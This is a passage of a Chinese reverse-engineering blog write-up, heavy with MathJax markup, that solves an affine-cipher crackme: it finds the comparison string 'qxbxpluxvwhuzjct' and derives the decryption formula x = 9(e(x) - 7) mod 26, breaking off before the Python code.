-14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(7890,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/14.png" class="">
<p>最后，加密后的内容（在 <code>esp+70h+var_64</code>）与程序中的字符串 <code>qxbxpluxvwhuzjct</code> 比较，若成功就会得到 <code>You really knows</code> 了。</p>
<p>再用<kbd> F5</kbd> 看下伪代码确认下分析是否正确。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/04/24/experiments/security/reverse/affineenc/16.png" class=""></div><div class="group-picture-column"><img data-src="/2019/04/24/experiments/security/reverse/affineenc/15.png" class=""></div></div></div>
<p>该知道的都知道了，可以开始写 payload 了！</p>
<h2 id="Payload-编写">Payload 编写</h2>
<p>整理一下思路：<br>
输入的内容经过仿射密钥加密，函数为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.731ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8279 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1823.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mi" transform="translate(2323.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(3117.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(4118,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(4618,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5007,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5885,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(6370,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mn" transform="translate(6890,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(7890,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，密文 <code>e(x)</code> 为 <code>qxbxpluxvwhuzjct</code><br>
根据密码学的知识，解密密钥应为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="47.92ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 21180.7 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(1905.6,0)"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3392.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3781.2,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(4247.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4636.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(5208.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5819.5,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(6819.7,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(7319.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7708.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(8097.7,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(8975.7,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(9460.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mn" transform="translate(9980.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(10980.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11647.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(12703.2,0)"><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"></path></g><g data-mml-node="mo" transform="translate(13203.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(13592.2,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(14058.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(14447.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(15019.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(15630.5,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(16630.7,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(17130.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(17519.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(17908.7,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(18786.7,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(19271.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mn" transform="translate(19791.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(20791.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<p>编写 python 解密程序如下</p>
